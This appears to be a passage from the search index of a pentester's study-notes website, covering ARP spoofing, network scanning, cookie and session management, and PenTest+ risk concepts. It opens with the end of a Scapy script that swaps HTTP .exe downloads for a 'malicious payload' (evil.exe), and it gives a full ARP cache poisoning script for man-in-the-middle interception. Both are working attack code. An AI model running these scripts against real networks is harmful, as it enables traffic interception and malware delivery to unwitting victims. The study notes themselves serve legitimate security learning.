scapy_packet.haslayer(scapy.Raw): if scapy_packet[scapy.TCP].dport == 80: if \u0026#34;.exe\u0026#34; in scapy_packet[scapy.Raw].load and \u0026#34;localhost\u0026#34; not in scapy_packet[scapy.Raw].load: print(\u0026#34;[+] exe Request\u0026#34;) # add the TCP - ACK number of the TCP packet (the HTTP request packet) to a seperate list so we can check that # against the TCP - SEQ number in the response ack_list.append(scapy_packet[scapy.TCP].ack) elif scapy_packet[scapy.TCP].sport == 80: # check if response corresponds to a request in our ack list if scapy_packet[scapy.TCP].seq in ack_list: ack_list.remove(scapy_packet[scapy.TCP].seq) print(\u0026#34;[+] Replacing file\u0026#34;) modified_packet = set_load(scapy_packet, # note the trailing newlines \u0026#34;HTTP/1.1 301 Moved Permanently\\nLocation: http://localhost:8000/Downloads/evil.exe\\n\\n\u0026#34;) packet.set_payload(str(modified_packet)) packet.accept() queue = netfilterqueue.NetfilterQueue() queue.bind(0, process_packet) queue.run() ","description":"After we become the mitm we can modify HTTP responses by changing the Raw data.\nIn this case we check if the victim is downloading a .exe file and we are changing the response from the server so that it includes are own malicious payload.\nWe do check against the destination port (dport) and source port (sport). When a sport is present it is a response, when a dport is present it is a request."},{"id":32,"href":"/arp/arp_cache_poisoning/","title":"Arp cache poisoning","parent":"arp","content":"With Scapy you can easily send crafted ARP reply packets. The idea is to constantly send the victim ARP replies telling it we are the router.. We do the same for the router, we tell it we are the victim machine. After we become the man in the middle we can intercept \u0026amp; inspect all data.\nTo allow forwarding of packets between the victim and the gateway we need to enable ip_forward:\necho \u0026#39;1\u0026#39; \u0026gt; /proc/sys/net/ipv4/ip_forward The function get_mac sends arp request message (\u0026ldquo;Who has\u0026rdquo;) to the broadcast address, so all clients on the LAN receive it,\nwe will get the correct mac address back from the target_ip.\nNow that we have the correct mac address from the target we can start sending spoofed reply packets with spoof function (\u0026rsquo;target_ip\u0026rsquo; is at \u0026lsquo;attacker mac address\u0026rsquo;)\nand\nThe full code:\n#!/usr/bin/env python import scapy.all as scapy import time import argparse def get_arguments(): parser = argparse.ArgumentParser() parser.add_argument(\u0026#34;-t\u0026#34;, \u0026#34;--target\u0026#34;, dest=\u0026#34;target\u0026#34;, help=\u0026#34;Target IP\u0026#34;) parser.add_argument(\u0026#34;-g\u0026#34;, \u0026#34;--gateway\u0026#34;, dest=\u0026#34;gateway\u0026#34;, help=\u0026#34;Gateway IP\u0026#34;) options = parser.parse_args() return options # Get target mac address using ip address def get_mac(ip): arp_request = scapy.ARP(pdst=ip) broadcast = scapy.Ether(dst=\u0026#34;ff:ff:ff:ff:ff:ff\u0026#34;) arp_request_broadcast = broadcast/arp_request answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] return answered_list[0][1].hwsrc # Change mac address in arp table def spoof(target_ip, spoof_ip): target_mac = get_mac(target_ip) packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) scapy.send(packet, verbose=False) # Restore mac address in arp table def restore(dest_ip, source_ip): dest_mac = get_mac(dest_ip) source_mac = get_mac(source_ip) packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac) scapy.send(packet, count=4, verbose=False) options = get_arguments() sent_packets_count = 0 try: while True: spoof(options.target, options.gateway) spoof(options.gateway, options.target) sent_packets_count = sent_packets_count + 2 print(\u0026#34;\\r[+] ARP spoofing started - packets sent: \u0026#34; + str(sent_packets_count)) time.sleep(2) except KeyboardInterrupt: print(\u0026#34;\\nCTRL+C pressed .... Reseting ARP tables. Please wait\u0026#34;) restore(options.target, options.gateway) restore(options.gateway, options.target) print(\u0026#34;\\nARP table restored. Quiting\u0026#34;) ","description":"With Scapy you can easily send crafted ARP reply packets. The idea is to constantly send the victim ARP replies telling it we are the router.. We do the same for the router, we tell it we are the victim machine. After we become the man in the middle we can intercept \u0026amp; inspect all data.\nTo allow forwarding of packets between the victim and the gateway we need to enable ip_forward:"},{"id":33,"href":"/arp/arp_scanning/","title":"Network scanning using arp","parent":"arp","content":"We can scan the LAN by sending an ARP request to the broadcast mac address iterating over every IP we specify.\nWhen a device sends a packet to the broadcast MAC address (FF:FF:FF:FF:FF:FF), it is delivered to all stations on the local network.\nArp request says: \u0026ldquo;who has 192.168.0.10?\u0026rdquo;\nIf a host with ip 192.168.0.10 is online it will reply with an ARP reply message saying: \u0026ldquo;I have 192.168.0.10, my mac address is 00:22:33:44:55:66\u0026rdquo;\nThe arp table on every host contains a list of all the IP address to MAC address mappings.\nimport scapy.all as scapy import argparse def get_arguments(): parser = argparse.ArgumentParser() parser.add_argument(\u0026#34;-t\u0026#34;, \u0026#34;--target\u0026#34;, dest=\u0026#34;target\u0026#34;, help=\u0026#34;Target IP / IP Range\u0026#34;) options = parser.parse_args() if not options.target: parser.error(\u0026#34;[-] Please specify an ip range, use --help for more info.\u0026#34;) return options def scan(ip): arp_req = scapy.ARP(pdst=ip) broadcast = scapy.Ether(dst=\u0026#34;ff:ff:ff:ff:ff:ff\u0026#34;) arp_req_broadcast = broadcast/arp_req answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0] clients_list = [] # creating a list[] of dictionaries {} for element in answered_list: client_dict = {\u0026#34;ip\u0026#34;: element[1].psrc, \u0026#34;mac\u0026#34;: element[1].hwsrc} clients_list.append(client_dict) return clients_list def print_result(results_list): print(\u0026#34;IP\\t\\t\\tMAC ADRESS\\n------------------------------------------\u0026#34;) for client in results_list: print(client[\u0026#34;ip\u0026#34;] + \u0026#34;\\t\\t\u0026#34; + client[\u0026#34;mac\u0026#34;]) options = get_arguments() scan_result = scan(options.target) print_result(scan_result) ","description":"We can scan the LAN by sending an ARP request to the broadcast mac address iterating over every IP we specify.\nWhen a device sends a packet to the broadcast MAC address (FF:FF:FF:FF:FF:FF), it is delivered to all stations on the local network.\nArp request says: \u0026ldquo;who has 192.168.0.10?\u0026rdquo;\nIf a host with ip 192.168.0.10 is online it will reply with an ARP reply message saying: \u0026ldquo;I have 192.168.0.10, my mac address is 00:22:33:44:55:66\u0026rdquo;"},{"id":34,"href":"/web/webapps/session_management_intro/","title":"Session Management Intro","parent":"Webapps","content":" Since HTTP is a stateless protocol (meaning if you send two requests to the same server, it has no idea it came from the same user) the idea of the session came along. The session is basically just an object kept in memory by the Web Application so that it can identify each user. After the initial request from a user the server will reply back with the session ID and every time a new request comes in from that same user the assigned ID will be in the request. In the browser this ID is usually stored as a cookie. So the browser will attach this cookie automatically with each new request. This way the server will actually know that its you. IMPORTANT NOTE: the session ID needs to be protected in some way, because it could be stolen by someone that can then hijack your session. A cookie can be either a session cookie which will be lost after you close the browser or it can be permanent which will then be written to disk when you close your browser and loaded again when you open the browser. Most cookies are used for marketing or tracking. The Set-Cookie HTTP response header is used to send cookies from the server to the user agent: Set-Cookie: \u0026lt;cookie-name\u0026gt;=\u0026lt;cookie-value\u0026gt; Set-Cookie: \u0026lt;cookie-name\u0026gt;=\u0026lt;cookie-value\u0026gt;; Expires=\u0026lt;date\u0026gt; Set-Cookie: \u0026lt;cookie-name\u0026gt;=\u0026lt;cookie-value\u0026gt;; Max-Age=\u0026lt;non-zero-digit\u0026gt; Set-Cookie: \u0026lt;cookie-name\u0026gt;=\u0026lt;cookie-value\u0026gt;; Domain=\u0026lt;domain-value\u0026gt; Set-Cookie: \u0026lt;cookie-name\u0026gt;=\u0026lt;cookie-value\u0026gt;; Path=\u0026lt;path-value\u0026gt; Set-Cookie: \u0026lt;cookie-name\u0026gt;=\u0026lt;cookie-value\u0026gt;; Secure Set-Cookie: \u0026lt;cookie-name\u0026gt;=\u0026lt;cookie-value\u0026gt;; HttpOnly Set-Cookie: \u0026lt;cookie-name\u0026gt;=\u0026lt;cookie-value\u0026gt;; SameSite=Strict Set-Cookie: \u0026lt;cookie-name\u0026gt;=\u0026lt;cookie-value\u0026gt;; SameSite=Lax Multiple directives are also possible, for example:\nSet-Cookie: \u0026lt;cookie-name\u0026gt;=\u0026lt;cookie-value\u0026gt;; Domain=\u0026lt;domain-value\u0026gt;; Secure; HttpOnly If the Path value is set to http://www.reddit.com the cookie is also valid for all requests that come from reddit SUBDOMAINS. If there is no Domain value set the COOKIE is only valid for the domain that send it. HttpOnly is a flag added to cookies that tell the browser not to display the cookie through client-side scripts, so it can not be used by Javascript in any cross site scripting attacks. The Secure value is used to determine if the COOKIE should be sent only threw encrypted channels. SESSION ID NAME FINGERPRINTING: The session ID names used by the most common web application development frameworks can be easily fingerprinted, such as PHPSESSID (PHP), JSESSIONID (Tomcat/J2EE), CFID \u0026amp; CFTOKEN (ColdFusion), ASP.NET_SessionId (ASP .NET), etc. Therefore, the session ID name can disclose the technologies and programming languages used by the web application. It is recommended to change the default session ID name of the web development framework to a generic name, such as “id”. SESSION ID LENGTH: The session ID must be long enough to prevent brute force attacks, where an attacker can go through the whole range of ID values and verify the existence of valid sessions. The session ID length must be at least 128 bits (16 bytes). ","description":"Since HTTP is a stateless protocol (meaning if you send two requests to the same server, it has no idea it came from the same user) the idea of the session came along. The session is basically just an object kept in memory by the Web Application so that it can identify each user. After the initial request from a user the server will reply back with the session ID and every time a new request comes in from that same user the assigned ID will be in the request."},{"id":35,"href":"/cryptography/ciphers/","title":"Ciphers","parent":"cryptography","content":"Ciphers\nCaesar Cipher \u0026amp; ROT13 One Time Pad XOR Cipher ","description":"Ciphers\nCaesar Cipher \u0026amp; ROT13 One Time Pad XOR Cipher "},{"id":36,"href":"/cryptography/hashing/","title":"Hashing","parent":"cryptography","content":"Hashing\nLinux Password Hash Cracking MD5 \u0026amp; SHA Hashes Windows Password Hash Cracking ","description":"Hashing\nLinux Password Hash Cracking MD5 \u0026amp; SHA Hashes Windows Password Hash Cracking "},{"id":37,"href":"/cryptography/strong_encryption/","title":"Strong Encryption","parent":"cryptography","content":"Strong encryption\nAES \u0026amp; Padding Oracle Attack ","description":"Strong encryption\nAES \u0026amp; Padding Oracle Attack "},{"id":38,"href":"/web/http/","title":"HTTP","parent":"web","content":"Http\nHTTP code injection \u0026amp; BeEF HTTP credentials sniffing Modifying HTTP download response SSL stripping ","description":"Http\nHTTP code injection \u0026amp; BeEF HTTP credentials sniffing Modifying HTTP download response SSL stripping "},{"id":39,"href":"/web/webapps/","title":"Webapps","parent":"web","content":"Webapps\nSession Management Intro ","description":"Webapps\nSession Management Intro "},{"id":40,"href":"/","title":"Home","parent":"","content":"I am a junior pentester \u0026amp; ethical hacker. Most of the posts here are a compilation of information coming directly from books, video’s or other online resources that i found important enough to document for future use.\nThanks to https://github.com/thegeeklab for the great Hugo theme!\nhttps://geekdocs.de/usage/getting-started/\n","description":"I am a junior pentester \u0026amp; ethical hacker. Most of the posts here are a compilation of information coming directly from books, video’s or other online resources that i found important enough to document for future use.\nThanks to https://github.com/thegeeklab for the great Hugo theme!\nhttps://geekdocs.de/usage/getting-started/"},{"id":41,"href":"/cmp-t-pentest+/planning/","title":"Planning an Engagement","parent":"comp.t.sec+","content":"An engagement is a singular penetration testing project planned and scoped by the requesting client and the performing analysts.\nDomain 1: Planning \u0026amp; Scoping\nObjective 1.1: Compare and contrast governance, risk, and compliance concepts.\nObjective 1.2: Explain the importance of scoping and organizational/customer requirements.\nObjective 1.3: Given a scenario, demonstrate an ethical hacking mindset by maintaining.professionalism and integrity.\nRisk is made out of threats and vulnerabilities.\nPenetration Tester: an authorized threat actor who tries to to identify the ways an unauthorized intruder could damage a network.\n","description":"An engagement is a singular penetration testing project planned and scoped by the requesting client and the performing analysts.\nDomain 1: Planning \u0026amp; Scoping\nObjective 1.1: Compare and contrast governance, risk, and compliance concepts.\nObjective 1.2: Explain the importance of scoping and organizational/customer requirements.\nObjective 1.3: Given a scenario, demonstrate an ethical hacking mindset by maintaining.professionalism and integrity.\nRisk is made out of threats and vulnerabilities.\nPenetration Tester: an authorized threat actor who tries to to identify the ways an unauthorized intruder could damage a network."},{"id":42,"href":"/cmp-t-pentest+/risk/","title":"Risk","parent":"comp.t.sec+","content":"What is risk \u0026amp; where does risk exist?\nRisk = the probability that a threat will be realized.\nIf you are a Cybersec analyst (blue teamer) you\u0026rsquo;re job is to minimize vulnerabilities.\nIf you are working as a pentester you\u0026rsquo;re job is to find and exploit vulnerabilities to proof that the network is truelly vulnerable to an outside attack.\nVulnerability = any weakness in the system design or implementation\nThreat = anything that could cause harm, loss, damage or compromise to IT systems. Risk exists within the intersection area between vulnerabilities and threats.\nSo if there is a vulnerability but no threat (or the other way around) there is no risk. Risk management finds ways to minimize the likelihood of a certain outcome from occuring and to achieve the desired outcomes.\nReal world examples:\nSuppose you have a laptop with sensitive data on it but it has no internet connection then a remote exploitation will be hard.\nAn armed bank robber is an example of a threat. A bank teller is an example of a valuable resource that may be vulnerable during a bank robbery. Bullet-proof glass between the robber and the teller denies the robber the opportunity to shoot the teller. The threat remains present, but one of its harmful effects (a gun shot) has been mitigated by a protection mechanism (the glass).\nInherent Risk = occurs when a risk has been identified but no mitigation factors are applied.\nResidual Risk = occurs when we calculate the risk after applying mitigations and security controls. Example of residual risk = zero day vulnerability.\nRisk exception = created risk due to an exemption being granted or failure or failure to comply with corporate policy.\n","description":"What is risk \u0026amp; where does risk exist?\nRisk = the probability that a threat will be realized.\nIf you are a Cybersec analyst (blue teamer) you\u0026rsquo;re job is to minimize vulnerabilities.\nIf you are working as a pentester you\u0026rsquo;re job is to find and exploit vulnerabilities to proof that the network is truelly vulnerable to an outside attack.\nVulnerability = any weakness in the system design or implementation\nThreat = anything that could cause harm, loss, damage or compromise to IT systems."},{"id":43,"href":"/tags/","title":"Tags","parent":"Home","content":"","description":""}]